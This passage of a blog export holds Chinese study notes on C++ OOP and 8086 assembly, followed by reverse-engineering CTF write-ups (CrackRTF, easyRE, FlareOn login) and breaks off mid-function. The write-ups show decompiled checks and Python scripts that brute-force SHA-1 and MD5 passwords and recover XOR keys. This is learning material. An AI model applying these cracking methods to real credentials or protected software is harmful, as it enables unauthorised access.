派生类中包含从基类继承来的数据成员，它们构成了“基类子对象”\n基类中的私有成员private，不允许在派生类成员函数中被访问，也不允许派生类的对象访问\n基类中的公有成员public\npubilc继承：成为派生类的公有成员\nprivate继承：只能供派生类成员函数访问，不能被派生类的对象访问\n基类中的保护成员protected\npublic继承：可以访问\nprivate继承：变成private成员\n- 派生类中函数重写（override） 基类已定义的成员函数，在派生类中可以重新定义，称为“函数重写”\n重写的函数参数，返回值应与原函数一模一样\n重写发生时，基类中该成员函数的其他重载函数都将被屏蔽掉，不能提供给派生类对象使用\n可以在派生类中通过using 类名::成员函数名在派生类中恢复制定的成员函数，去掉屏蔽\n- 向上映射和向下映射 向上映射：由派生类对象转换为基类对象\n向上映射可以由编译器自动完成，是一种隐式的自动转换\n凡是接受基类对象的地方（如函数参数），都可以使用派生类对象，编译器会自动将派生类对象转换为基类对象\nclass Base{ public: void print(){cout \u0026lt;\u0026lt; \u0026quot;Base::print()\u0026quot; \u0026lt;\u0026lt; endl;} }; class Derive : public Base{ public: void print(){cout \u0026lt;\u0026lt; \u0026quot;Derive::print()\u0026quot; \u0026lt;\u0026lt; endl;} }; void fun(Base obj){ obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Base::print()发生了向上映射 return 0; } 向下映射：由基类对象转换为派生类对象\n使用虚函数，让编译器自动选择合适的函数 class Base{ public: virtual void print(){cout \u0026lt;\u0026lt; \u0026quot;Base::print()\u0026quot; \u0026lt;\u0026lt; endl;} }; class Derive : public Base{ public: void print(){cout \u0026lt;\u0026lt; \u0026quot;Derive::print()\u0026quot; \u0026lt;\u0026lt; endl;} }; void fun(Base\u0026amp; obj){ //obj 必须是对Base类的引用 obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Derive::print()编译器根据d的类型选择了合适的函数 return 0; } 虚析构函数 class B{ public: virtual void show(){cout \u0026lt;\u0026lt; \u0026quot;B.show()\u0026quot;;} virtual ~B(){cout \u0026lt;\u0026lt; \u0026quot;~B()\u0026quot;;} }; class D : public B{ public: void show(){cout \u0026lt;\u0026lt; \u0026quot;D.show()\u0026quot;;} ~D(){cout \u0026lt;\u0026lt; \u0026quot;~D()\u0026quot;;} }; void test(B* ptr){ //若删除virtual ptr -\u0026gt; show(); //运行结果 运行结果 } //D.show() D.show() int main(){ //~D() ~B() B* ptr = new D; //~B() test(ptr); delete ptr; return 0; } 禁止重写的虚函数（final关键字） class A{ public: virtual void fun() = 0; }; class B : public A{ public: void fun() final; //后续子类不可重写此接口函数 }; class C ：public B{ public: void fun(); //编译错误 }; 纯虚函数\nfun()=0\n包含纯虚函数的类不允许定义对象，只能为子类提供接口\n不同类之间自动类型转换 - 在源类中定义“目标类型转换运算符“ class Dst{ public: Dst(){cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst()\u0026quot; \u0026lt;\u0026lt; endl;} }; class Src{ public: Src(cout \u0026lt;\u0026lt; \u0026quot;Src::Src() \u0026lt;\u0026lt; endl\u0026quot; \u0026lt;\u0026lt; endl;) operator Dst() const{ cout \u0026lt;\u0026lt; \u0026quot;src::operator Dst() called\u0026quot; \u0026lt;\u0026lt; endl; return Dst(); } }; - 在目标类中定义“源类对象做参数的构造函数” class Src; //前置类型声明 class Dst{ public: Dst() {cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst()\u0026quot; \u0026lt;\u0026lt; endl;} Dst(const Src\u0026amp; s){ cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst(const Src\u0026amp;)\u0026quot; \u0026lt;\u0026lt;endl; } }; class Src{ public: Src(){cout \u0026lt;\u0026lt; \u0026quot;Src::Src()\u0026quot; \u0026lt;\u0026lt; endl;} } - 禁止自动类型转换 分别对应以上两种方法，加关键词explicit class Dst{ public: Dst(){cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst()\u0026quot; \u0026lt;\u0026lt; endl;} }; class Src{ public: Src(cout \u0026lt;\u0026lt; \u0026quot;Src::Src() \u0026lt;\u0026lt; endl\u0026quot; \u0026lt;\u0026lt; endl;) explicit operator Dst() const{ cout \u0026lt;\u0026lt; \u0026quot;src::operator Dst() called\u0026quot; \u0026lt;\u0026lt; endl; return Dst(); } }; class Src; //前置类型声明 class Dst{ public: Dst() {cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst()\u0026quot; \u0026lt;\u0026lt; endl;} explicit Dst(const Src\u0026amp; s){ cout \u0026lt;\u0026lt; \u0026quot;Dst::Dst(const Src\u0026amp;)\u0026quot; \u0026lt;\u0026lt;endl; } }; class Src{ public: Src(){cout \u0026lt;\u0026lt; \u0026quot;Src::Src()\u0026quot; \u0026lt;\u0026lt; endl;} } 利用=delete禁止自动类型转换 class T{ public: T (int){} T (char) = delete; } void fun(T t) {} int main(){ fun(1); fun('x'); //编译不通过 } 强制类型转换 - dynamic_cast\u0026lt;Dst_Type\u0026gt;(Src_var) Src_var必须是引用或指针类型，Dst_Type类中含有虚函数，否则会有编译错误\n若目标类与源类之间没有继承关系，则转换失败，返回空指针\n- static_cast\u0026lt;Dst_Type\u0026gt;(Src_var) 基类对象不能转换成派生类对象，但基类指针可以转换为派生类指针\n派生类对象（指针）可以转换为基类对象（指针）\n没有继承关系的类之间，必须有转换途径才能进行转换\n函数模板 - 函数模板的定义 template\u0026lt;typename T\u0026gt; 返回类型 函数名称（函数参数） template\u0026lt;typename T\u0026gt; T sum(T a, T b){return a + b;} - 函数模板参数可赋默认值 template\u0026lt;typename T0 = float, typename T1, typename T2 = float, typename T3, typename T4\u0026gt; T0 fun(T1 v1, T2 v2, T3 v3, T4 v4){……} …… fun(1,2,3); fun('a','b','cdf'); 类模板 基本定义 template\u0026lt;typename T\u0026gt;class A{ T data; public: void print(){cout \u0026lt;\u0026lt; data;} }; 类模板使用流程\n类模板\u0026mdash;实例化\u0026mdash;\u0026gt;类\u0026mdash;实例化\u0026mdash;\u0026gt;对象 类模板参数\n类型参数：使用typename或class标记\n非类型参数：整数，枚举，指针（指向对象或函数），引用（引用对象或函数）\ntemplate\u0026lt;typename T, unsigned size\u0026gt; class array{ T elems[size]; …… }; array\u0026lt;char,10\u0026gt; array0; //用类模板实例定义对象 模板参数是另一个类模板 template\u0026lt;typename T, template\u0026lt;typename TT0, typename TT1\u0026gt; class A\u0026gt; struct Foo{ A \u0026lt;T,T\u0026gt;bar; }; 模板特化 - 函数模板特化 template\u0026lt;typename T\u0026gt; T sum(T a, T b){ return a+b; } template\u0026lt;\u0026gt; char* sum(char* a, char* b){ char* p = new char[strlen(a) + strlen(b) + 1]; strcpy(p, a); strcat(p, b); return p; } - 类模板特化 //通用类模板 template\u0026lt;class T1, class T2\u0026gt; class A{……}; //部分特化的模板类：第二个参数指定为int（偏特化） template\u0026lt;class T1\u0026gt; class A \u0026lt;T1, int\u0026gt;{……}; //指定所有类型 template\u0026lt;\u0026gt; class A \u0026lt;int, int\u0026gt; {……}; ","id":23,"section":"posts","summary":"变量定义 - auto 由编译器根据上下文自动确定变量的类型 auto i = 3; //i是int型变量 auto k = 4.0f; //k是float型变量 - 指针变量的动态生成与删除 int* ptr =","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"https://blog.dx39061.top/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/","year":"2022"},{"content":"8086CPU汇编 - 8086CPU有14个寄存器 数据寄存器：AX,BX,CX,DX\n其他寄存器：CS:IP,SS:SP,DS,ES,SI,DI,BP,FLAG(PSW)\n8086CPU每一个寄存器都是16位的，存放2个字节\n通用寄存器都可以分为两个独立的8位寄存器使用，如AL（低8位）,AH（高8位）\n16位CPU特征：\n运算器一次最多可以处理16位数据\n寄存器的最大宽度为16位\n寄存器和运算器之间的通路是16位的\n- 8086CPU有20根地址总线 8086CPU采用在内部用两个16位地址合成（地址加法器）的方法形成一个20位的物理地址\n物理地址 = 段地址 * 16 + 偏移地址（16进制地址左移一位）\n推论：偏移地址为16位（0-FFFFH）\u0026ndash;\u0026gt;一个段最大长度位64kb（$2^{16}$)\n- CS(Code Segment):IP(Instruction Pointer) CS:IP指向CPU当前所要执行指令的地址\nIP递增器：执行完一条指令后，IP自动递增该指令的长度，跳到下一条指令\n8086CPU加电启动或复位后，设置CS=FFFFH，IP=0000H\n修改CS:IP寄存器的值\n同时修改CS:IP的内容：jmp 段地址：偏移地址\n仅修改IP的内容：jmp 某一合法寄存器（mov ax xxxx，jmp ax）\n- DS(Data Segment)和[address]（偏移地址） 经由通用寄存器将数据送入DS寄存器\nmov ax, 1000H mov ds, ax 使用[address]读写内存（确定好ds）\nmov ax, [0] //把偏移地址为0处内存的值送入ax mov [0], cx //把cx中的值写入偏移地址为0的内存 - 栈 push ax：把ax中的值送入栈中\npop ax：把从栈顶取出数据送入ax\n8086CPU入栈和出栈都是以字（16位）为单位进行的\n- SS(Stack Segment):SP(Stack Pointer) push ax\nSP = SP - 2\n将ax中的内容送入SS:SP指向的内存单元处，此时SS:SP指向新栈顶\npop ax\n将SS:SP指向的内存单元中数据取出送入ax中\nSP = SP + 2\n栈空时SS:SP指向栈最高地址（栈底）的偏移地址+2\n- 伪指令 编译器执行，无法汇编成机器码\n一个段\nassume cs:段名\u0026ndash;\u0026gt;寄存器与段的关联假设\n段名 segment\n段名 ends\nend：结束对源程序的编译\n- [BS] 作为偏移地址索引内存，默认段地址在ds中\nmov ax [1000H]只是将1000H作为值送入ax\n经由bx寄存器才能将偏移地址为1000H的内容送入ax\nmov bx, 1000H mov ax, [bx] - loop指令 loop实现循环，cx寄存器作为循环累加器\n格式\nmov cx，循环次数\n标号：循环执行代码\nloop 标号\n执行loop时cx = cx - 1，判断cx不为0则继续循环\n- SI（Source Index）DI（Destination Index） 与bx功能相近，但不能拆为两个8位寄存器\n用ds;si指向源数据地址，用ds:di指向目标数据地址\n- BP（Base Pointer） 作为偏移地址指向内存，段地址默认在SS中 - div（division）指令 除法指令\n除数：8位或16位，在寄存器或内存单元中\n被除数：（默认）放在ax或ax和dx中\n除数8位，被除数16位\u0026mdash;\u0026raquo;ax\n除数16位，被除数32位\u0026mdash;\u0026raquo;ax（低16位）和dx（高16位）\n结果\n商存放在ax中\n余数存放在dx中\n- jmp指令 jmp short 标号\n段内短转移\n8位地址偏移，而非指定跳转地址\njmp near 标号\n段内近转移\n16位地址偏移，而非指定跳转地址\njmp far 标号\n段间转移，远转移\n指定段地址和偏移地址，修改CS:IP的值\njmp 寄存器\n16位段内转移 - jcxz指令 有条件转移指令，短转移\n8位地址位移，而不是指定跳转地址\njcxz 标号\n当cx=0时跳转，cx!=0时不跳转\nloop指令，cx=0时跳出循环，cx！=0时继续循环\n- call，ret指令 ret：用栈中的值修改IP的值\nretf：用栈中的值修改CS:IP的值\ncall指令\n将当前的IP或CS:IP压入栈中\n转移（jmp）标号\ncall不能实现短转移（可近转移和短转移），除此之外和jmp指令原理相同\n- mul指令 存储位置\n都是8位：相乘的两个数存在al或内存中，结果存在ax中\n都是16位：相乘的两个数存在ax或内存中，结果存在dx（高位）和ax（低位）中\n格式\nmul 寄存器\nmul内存单元\n- flag寄存器 8086CPU中flag寄存器的1,3,5,12,13,14,15位没有使用\n记录上一条指令后的各种状态，随时改变\nZF（Zero Flag）标志-6\n表示结果是否为0,值为1则表示0,值为0则表示非0\nadd、sub、mul、div、inc、or、and等运算指令会影响标志寄存器\nmov、push、pop等传送指令对标志寄存器没有影响\nPF（Parity Flag）标志-2\n奇偶校验位，1为偶数，0为奇数 SF（Sign Flag）标志-7\n符号（正负）标志位，1为负，0为正 CF（Carry Flag）标志-0\n记录了进行无符号运算的时候运算结果的最高有效位是否向更高位的进位或借位，8位 OF（Overflow Flag）标志-11\n进行有符号数运算时，超过了机器所能表达的范围，将产生溢出 DF（Direction Flag）标志-10\n方向标志位，在串处理指令中，控制每次操作后si,di的增减\nDF=0,每次操作后si,di递增，cld指令设置为0\nDF=1,每次操作后si,di递减，std指令设置为1\nIF（Interrupt Flag）标志-9\n是否响应外部可屏蔽中断请求\n1-允许响应，0-不允许响应\nTF（Trace Flag）标志-8\n当TF为1时，CPU进入单步调试模式，执行完每一条指令后产生单步中断 AF（Auxiliary Carry Flag）标志-4\n辅助进位标志，进位（借位）标志\n与CF区别：4位运算有进位（借位）则置1,主要在BCD码时用到\n- adc指令 带进位加法指令，利用了 CF位上记录的进位值\n格式：adc ax, bx\n实际：ax = ax + bx + CF\nadd ax, bx //等价于 add al, bl adc ah, bh - sbb指令 带借位减法指令，利用了CF上记录的借位值\n格式：sbb ax, bx\n实际：ax = ax -bx - CF\n- cmp指令 格式：cmp 对象1, 对象2\n功能：对象1-对象2，不保存结果，将对标志寄存器产生影响\n例：cmp ax，ax\nZF=1\nPF=1\nSF=0\nCF=0\nOF=0\n例：mov ax,8 mov bx, 3 cmp ax, bx\nZF=0\nPF=1\nSF=0\nCF=0\nOF=0\n- 根据cmp结果的转移指令 //无符号数运算跳转\nje：等于则转移（ZF=1）\njne：不等于则转移（ZF=0）\njb：低于则转移（CF=1）\njnb：不低于则转移（CF=0）\nja：高于则转移（CF=0,ZF=0）\njna：不高于则转移（CF=1或ZF=1）\n- movsb指令 以字节为单位传送字符串，将ds:si指向的内存单元中的字节送入es:di中，然后根据DF标志位同步递增或递减si,di的值\n以字为单位传送：movsw\nrep movsb：根据cx中的值，重复执行后面的串传送指令，循环实现cx个字符的传送\n- pushf和popf指令 pushf：将标志寄存器的值压栈\npopf：从栈中弹出数据，送入标志寄存器中\n为直接访问标志寄存器提供了一种方法\n- 中断 CPU处理突发事件的一个重要技术，处理完成后立即返回断点，继续工作\n硬件中断\n外部中断：外部设备发出的中断请求，利用中断控制器可屏蔽\n内部中断：除法除数为0,溢出中断，不可屏蔽的中断\n软件中断\n不是真正的中断，只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H） 中断优先权\n除法错误、溢出中断、软件中断\n不可屏蔽中断\n可屏蔽中断\n单步中断\n中断类型码\n8086CPU用8位中断类型码索引中断处理程序\n中断类型码对应中断向量表中的地址指向中断处理程序\n8086CPU中断过程\n（从中断信息中）取得中断类型码\n标志寄存器的值入栈（保护标志位）\u0026ndash;\u0026raquo;pushf\n设置标志寄存器8-TF和9-IF为0 \u0026ndash;\u0026raquo;TF=0,IF=0\ncs的内容入栈 \u0026ndash;\u0026raquo;push CS\nIP的内容入栈 \u0026ndash;\u0026raquo;push IP\n从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS\n中断处理程序\n保存用到的寄存器\n处理中断\n恢复用到的寄存器\n用iret指令返回（pop IP pop CS popf）\n- int中断 内中断，引发中断过程\n格式：int 中断类型码\nint 21中断：\nint中断例程的4c号功能，即程序返回功能 mov ax，4c00h //等价于 mov ah, 4ch ;程序返回 mov al, 0 ;返回值，0表示正常返回 int 21h - CPU端口 利用in和out指令从指定端口中读或写数据\n8位端口用al寄存器，访问16位端口用ax寄存器\n- shl和shr指令 逻辑移位指令\n将一个寄存器或内存单元中的数据向左（右）移\n将最后多余的一位写入CF中\n最低位以0来补充\n如果移动位数大于1,必须将移动位数放在cl中\n- CMOS RAM 70H是CMOS RAM地址（读取）端口，71H是写入端口\nCMOS RAM中存放着当前时间，以下信息长度均为1个字节\n秒：00H\n分：02H\n时：04H\n日：07H\n月：08H\n年：09H\n- bcd码 每4位表示一个十进制位\n4位内部用二进制0000\u0026ndash;1001表示0-9\n","id":24,"section":"posts","summary":"8086CPU汇编 - 8086CPU有14个寄存器 数据寄存器：AX,BX,CX,DX 其他寄存器：CS:IP,SS:SP,DS,ES,SI,DI","tags":["assembly"],"title":"8086CPU汇编","uri":"https://blog.dx39061.top/2022/02/8086cpu%E6%B1%87%E7%BC%96/","year":"2022"},{"content":"buuoj re wp CrackRTF ida定位main函数F5 int __cdecl main_0(int argc, const char **argv, const char **envp) { DWORD v3; // eax DWORD v4; // eax char Str[260]; // [esp+4Ch] [ebp-310h] BYREF int v7; // [esp+150h] [ebp-20Ch] char String1[260]; // [esp+154h] [ebp-208h] BYREF char Destination[260]; // [esp+258h] [ebp-104h] BYREF memset(Destination, 0, sizeof(Destination)); memset(String1, 0, sizeof(String1)); v7 = 0; printf(\u0026quot;pls input the first passwd(1): \u0026quot;); scanf(\u0026quot;%s\u0026quot;, Destination); if ( strlen(Destination) != 6 ) { printf(\u0026quot;Must be 6 characters!\\n\u0026quot;); ExitProcess(0); } v7 = atoi(Destination); // atoi是把字符串形式的数字转化为数字，可确定6位数字密码，即可爆破 if ( v7 \u0026lt; 100000 ) ExitProcess(0); strcat(Destination, \u0026quot;@DBApp\u0026quot;); v3 = strlen(Destination); sub_40100A((BYTE *)Destination, v3, String1); // 动调测试可知为sha1加密，爆破拿前6位密码 if ( !_strcmpi(String1, \u0026quot;6E32D0943418C2C33385BC35A1470250DD8923A9\u0026quot;) ) { printf(\u0026quot;continue...\\n\\n\u0026quot;); printf(\u0026quot;pls input the first passwd(2): \u0026quot;); memset(Str, 0, sizeof(Str)); scanf(\u0026quot;%s\u0026quot;, Str); if ( strlen(Str) != 6 ) { printf(\u0026quot;Must be 6 characters!\\n\u0026quot;); ExitProcess(0); } strcat(Str, Destination); memset(String1, 0, sizeof(String1)); v4 = strlen(Str); sub_401019((BYTE *)Str, v4, String1); // 动调测试得知为md5,但爆破6位全字符不现实，密码无法从这获得 if ( !_strcmpi(\u0026quot;27019e688a4e62a649fd99cadaafdb4e\u0026quot;, String1) ) { if ( !(unsigned __int8)sub_40100F(Str) ) { printf(\u0026quot;Error!!\\n\u0026quot;); ExitProcess(0); } printf(\u0026quot;bye ~~\\n\u0026quot;); } } return 0; } 题目需要输入两次密码，分别经加密函数后与已知字符串比较\n第一次加密\n加密前atoi函数作用是把string形式的数字转化为int类型的数字，提示前6位密码为6位数字\nsub_40100A是第一个加密函数，内部调用了windows库的加密函数，可以通过查看windows官方文档辨别参数得知为sha1加密，我这里是用动调对比在线加密网站加密结果确定加密算法为sha1\n//sub_40100A内部嵌套sub_401230函数 int __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1) { int result; // eax DWORD i; // [esp+4Ch] [ebp-28h] CHAR String2[4]; // [esp+50h] [ebp-24h] BYREF BYTE v6[20]; // [esp+54h] [ebp-20h] BYREF DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF if ( !CryptAcquireContextA(\u0026amp;phProv, 0, 0, 1u, 0xF0000000) ) return 0; if ( CryptCreateHash(phProv, 0x8004u, 0, 0, \u0026amp;phHash) ) { if ( CryptHashData(phHash, pbData, dwDataLen, 0) ) { CryptGetHashParam(phHash, 2u, v6, \u0026amp;pdwDataLen, 0); *lpString1 = 0; for ( i = 0; i \u0026lt; pdwDataLen; ++i ) { wsprintfA(String2, \u0026quot;%02X\u0026quot;, v6[i]); lstrcatA(lpString1, String2); } CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 1; } else { CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 0; } } else { CryptReleaseContext(phProv, 0); result = 0; } return result; } sha1是单向散列函数，没法逆，幸好是6位数字，直接爆破拿到密码123321 import hashlib for i in range(100000,999999): sha1 = hashlib.sha1() inp = str(i) + \u0026quot;@DBApp\u0026quot; sha1.update(inp.encode(\u0026quot;utf-8\u0026quot;)) if sha1.hexdigest().lower() == \u0026quot;6E32D0943418C2C33385BC35A1470250DD8923A9\u0026quot;.lower(): print(i) # output：123321 同理第二个加密算法可知为md5，但没有限定为数字，试了试6位数字爆破没有结果，6位全字符爆破不现实\n继续往下看sub_40100F传参调用了输入的str\n//sub_40100F中嵌套了sub_4014D0 char __cdecl sub_4014D0(LPCSTR lpString) { LPCVOID lpBuffer; // [esp+50h] [ebp-1Ch] DWORD NumberOfBytesWritten; // [esp+58h] [ebp-14h] BYREF DWORD nNumberOfBytesToWrite; // [esp+5Ch] [ebp-10h] HGLOBAL hResData; // [esp+60h] [ebp-Ch] HRSRC hResInfo; // [esp+64h] [ebp-8h] HANDLE hFile; // [esp+68h] [ebp-4h] hFile = 0; hResData = 0; nNumberOfBytesToWrite = 0; NumberOfBytesWritten = 0; hResInfo = FindResourceA(0, (LPCSTR)0x65, \u0026quot;AAA\u0026quot;);// Resource-Hacker看资源 if ( !hResInfo ) return 0; nNumberOfBytesToWrite = SizeofResource(0, hResInfo); hResData = LoadResource(0, hResInfo); if ( !hResData ) return 0; lpBuffer = LockResource(hResData); sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite);// 和lpString异或得到lpbuffer hFile = CreateFileA(\u0026quot;dbapp.rtf\u0026quot;, 0x10000000u, 0, 0, 2u, 0x80u, 0); if ( hFile == (HANDLE)-1 ) return 0; if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026amp;NumberOfBytesWritten, 0) ) return 0; CloseHandle(hFile); return 1; } sub_401005函数内部进行逐位异或 //sub_401005内部嵌套sub_401420 void __cdecl sub_401420(LPCSTR lpString, char *_8, int _C) { unsigned int i; // [esp+4Ch] [ebp-Ch] unsigned int v4; // [esp+54h] [ebp-4h] v4 = lstrlenA(lpString); for ( i = 0; i \u0026lt; _C; ++i ) _8[i] ^= lpString[i % v4]; // 根据RTF文件头解出6位密码 } _8数组初值为资源AAA中的值，可用ResourceHacker查看资源得到 lpString的值可由RTF文件头得到7B 5C 72 74 66，但这只有5位，翻看大佬wp好像第6位默认是0x31？但这一点翻了会google未找到依据\n我这里是先用异或解出前5位，然后结合md5爆破出最后一位，虽然麻烦，但确保正确\nimport hashlib RtfHead = [0x7B,0x5C,0x72,0x74,0x66] AAA = [0x05,0x7d,0x41,0x15,0x26] key = \u0026quot;\u0026quot; for i in range(5): key += chr(RtfHead[i] ^ AAA[i]) for i in range(32,127): md5 = hashlib.md5() inp = key + chr(i) + \u0026quot;123321@DBApp\u0026quot; md5.update(inp.encode(\u0026quot;utf-8\u0026quot;)) if md5.hexdigest().lower() == \u0026quot;27019e688a4e62a649fd99cadaafdb4e\u0026quot;: print(key + chr(i)) #output：~!3a@0 运行程序输入两次密码，会生成dbapp.rtf文件，打开即可看到flagFlag{N0_M0re_Free_Bugs}\n[2019红帽杯]easyRE 参考官方wp，这真是道眼力题。。\n进ida，首先看到start函数，啥也不是，翻string窗口，很显眼的You found me，跟进去\n__int64 sub_4009C6() { __int64 result; // rax int i; // [rsp+Ch] [rbp-114h] __int64 v2; // [rsp+10h] [rbp-110h] __int64 v3; // [rsp+18h] [rbp-108h] __int64 v4; // [rsp+20h] [rbp-100h] __int64 v5; // [rsp+28h] [rbp-F8h] __int64 v6; // [rsp+30h] [rbp-F0h] __int64 v7; // [rsp+38h] [rbp-E8h] __int64 v8; // [rsp+40h] [rbp-E0h] __int64 v9; // [rsp+48h] [rbp-D8h] __int64 v10; // [rsp+50h] [rbp-D0h] __int64 v11; // [rsp+58h] [rbp-C8h] char v12[36]; // [rsp+60h] [rbp-C0h] BYREF char input1[32]; // [rsp+90h] [rbp-90h] BYREF int v14; // [rsp+B0h] [rbp-70h] char v15; // [rsp+B4h] [rbp-6Ch] char input2[72]; // [rsp+C0h] [rbp-60h] BYREF unsigned __int64 v17; // [rsp+108h] [rbp-18h] v17 = __readfsqword(0x28u); qmemcpy(v12, \u0026quot;Iodl\u0026gt;Qnb(ocy\u0026quot;, 12); v12[12] = 127; qmemcpy(\u0026amp;v12[13], \u0026quot;y.i\u0026quot;, 3); v12[16] = 127; qmemcpy(\u0026amp;v12[17], \u0026quot;d`3w}wek9{iy=~yL@EC\u0026quot;, 19); memset(input1, 0, sizeof(input1)); v14 = 0; v15 = 0; Read(0, input1, 0x25uLL); v15 = 0; if ( _strlen_sse2(input1) == 36 ) { for ( i = 0; i \u0026lt; (unsigned __int64)_strlen_sse2(input1); ++i ) { if ( (unsigned __int8)(input1[i] ^ i) != v12[i] ) { result = 4294967294LL; goto LABEL_13; } } puts(\u0026quot;continue!\u0026quot;); memset(input2, 0, 0x40uLL); input2[64] = 0; Read(0, input2, 0x40uLL); input2[39] = 0; if ( _strlen_sse2(input2) == 39 ) { v2 = Base64enc(input2); v3 = Base64enc(v2); v4 = Base64enc(v3); v5 = Base64enc(v4); v6 = Base64enc(v5); v7 = Base64enc(v6); v8 = Base64enc(v7); v9 = Base64enc(v8); v10 = Base64enc(v9); v11 = Base64enc(v10); if ( !(unsigned int)Strcmp(v11, off_6CC090) ) { puts(\u0026quot;You found me!!!\u0026quot;); puts(\u0026quot;bye bye~\u0026quot;); } result = 0LL; } else { result = 4294967293LL; } } else { result = 0xFFFFFFFFLL; } LABEL_13: if ( __readfsqword(0x28u) != v17 ) sub_444020(); return result; } 两次输入，两次加密比较，都很常规\n第一个异或解密\nenc1 = \u0026quot;Iodl\u0026gt;Qnb(ocy\u0026quot; + chr(127) + \u0026quot;y.i\u0026quot; + chr(127) + \u0026quot;d`3w}wek9{iy=~yL@EC\u0026quot; print(len(enc1)) for i in range(36): print(chr(ord(enc1[i]) ^ i),end=\u0026quot;\u0026quot;) #output： Info:The first four chars are `flag` 第二个可以看出来是base64加密了10遍，解密得到https://bbs.pediy.com/thread-254172.htm，然后寄！\n翻各种奇奇怪怪的系统函数实现，也没看出来个所以然，看了看wp,其实上面文章中也有提示，但我也没认真看（（\n在第二次加密后比较的字符串位置后面，还存着一个规律的字符串\n查交叉引用定位函数sub_400D35 unsigned __int64 sub_400D35() { unsigned __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-24h] int i; // [rsp+10h] [rbp-20h] int j; // [rsp+14h] [rbp-1Ch] unsigned int key; // [rsp+24h] [rbp-Ch] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v1 = sub_43FD20(0LL) - qword_6CEE38; for ( i = 0; i \u0026lt;= 1233; ++i ) { sub_40F790(v1); sub_40FE60(); sub_40FE60(); v1 = sub_40FE60() ^ 0x98765432; } key = v1; if ( ((unsigned __int8)v1 ^ a5VENbThlNr2e[0]) == 'f' \u0026amp;\u0026amp; (HIBYTE(key) ^ a5VENbThlNr2e[3]) == 'g' ) { for ( j = 0; j \u0026lt;= 24; ++j ) putchar((unsigned __int8)(a5VENbThlNr2e[j] ^ *((_BYTE *)\u0026amp;key + j % 4))); } result = __readfsqword(0x28u) ^ v5; if ( result ) sub_444020(); return result; } 第一次异或得到前四位为flag，第二次异或输出flag en_flag = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B, 0x00] chars = \u0026quot;flag\u0026quot; key = [0]*4 for i in range(4): key[i] = en_flag[i] ^ ord(chars[i]) for i in range(26): print(chr(en_flag[i] ^ key[i%4]),end=\u0026quot;\u0026quot;) #output：flag{Act1ve_Defen5e_Test} [FlareOn4]login 解压压缩包得到一个html文件，源码如下 \u0026lt;!DOCTYPE Html /\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;FLARE On 2017\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;flag\u0026quot; id=\u0026quot;flag\u0026quot; value=\u0026quot;Enter the flag\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;prompt\u0026quot; value=\u0026quot;Click to check the flag\u0026quot; /\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; document.getElementById(\u0026quot;prompt\u0026quot;).onclick = function () { var flag = document.getElementById(\u0026quot;flag\u0026quot;).value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c \u0026lt;= \u0026quot;Z\u0026quot; ? 90 : 122) \u0026gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);}); if (\u0026quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\u0026quot; == rotFlag) { alert(\u0026quot;Correct flag!\u0026quot;); } else { alert(\u0026quot;Incorrect flag, rot again\u0026quot;); } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 计算rotFlag属于是极致的压行了，为的就是让人迷糊看不懂，翻译成py大概长这样 flag = \u0026quot;plain_text\u0026quot; for i in range(36): if(flag[i] \u0026lt;= \u0026quot;Z\u0026quot;): t = 90 else: t = 122 flag[i] = chr(ord(flag[i]) + 13) if(t \u0026lt; flag[i]): flag[i] -= 26 flag所有位会先加上13，然后如果符合if条件会再减26\n要想完全理清楚一位一位逆回去很麻烦，但总的来说逆回去要么加13要么减13\n盲猜flag是有意义的字符串，所以我把可能的情况全列出来（一位两种可能），人工挑选正确答案\nen_flag = \u0026quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\u0026quot; for i in en_flag: if(i.isalpha() == False):#只替换flag中的字母 print(i) continue if(ord(i)+ 13 \u0026lt;= 126):#加这个判断是因为如果超出可见字符，无法输出则排列会很难看 print(chr(ord(i)+13),end=\u0026quot; \u0026quot;) print(chr(ord(i)-13)) 程序输出 ] C l i e n T t Z S 9 i ~ d e f L o U g i n T s Y [ A r X e _ E { a s Y y _ @ f l { a r X e - o U n T . } c o U m 其中如果某一行既有字母又有非字母，可以直接舍弃非字母，因为非字母开始就不会被替换\n仔细看一会，得到flag{ClientSideLoginsAreEasy@flare-on.com}\n[GUET-CTF2019]re 拖入ida发现函数很少，感觉有壳，果然是upx，先脱壳然后再进ida\n主要函数\n__int64 __fastcall sub_400E28(__int64 a1, __int64 a2, __int64 a3, __int64 a4, 